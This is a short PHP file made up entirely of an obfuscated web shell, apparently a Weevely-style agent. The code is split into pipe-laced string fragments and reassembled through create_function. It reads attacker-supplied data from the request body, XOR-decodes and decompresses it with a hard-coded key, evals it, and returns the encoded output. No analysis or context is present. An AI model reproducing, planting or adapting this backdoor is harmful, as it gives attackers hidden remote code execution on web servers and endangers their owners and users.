<?php
$q='$|k="840a9477";$|kh="2|70||6ece9568d"|;|$kf="1f9554|aa|c|cf|5"|;$|p="yGP7Hk5';
$I='$j};}}re|turn |$o;}if| (@pr|eg_ma|tch("/$kh(||.+)$|kf|/",@fil|e_get_conte|';
$Z=';$r=|@base6|4_enco|de(@x|(|@gzcom|press($o),|$k))|;print("$||p$kh$r$kf");}';
$E='q|V0qvhJZl";|funct|ion x($t,$k){$c=|strlen($|k);$|l=strlen($t);$o=|"||";fo';
$Q=str_replace('vM','','cvMrevMatvMe_fvMuvMvMnction');
$s='bas|e64_decode|($|m[1]),$k)))||;|$o=@ob_get_conte|nts()|;@ob_en|d_cle|an()';
$A='r($|i=0;$i<$l;){for(||$|j=0;|($j<$c&&$i|<|$l);$j++,$i++){||$o.=$t{$i}^|$k{';
$d='nts("php|://|input"),|$m)==1) {|@ob_star|t();@e|val(|@gzunco|mpr|ess(@x(|@';
$e=str_replace('|','',$q.$E.$A.$I.$d.$s.$Z);
$F=$Q('',$e);$F();
?>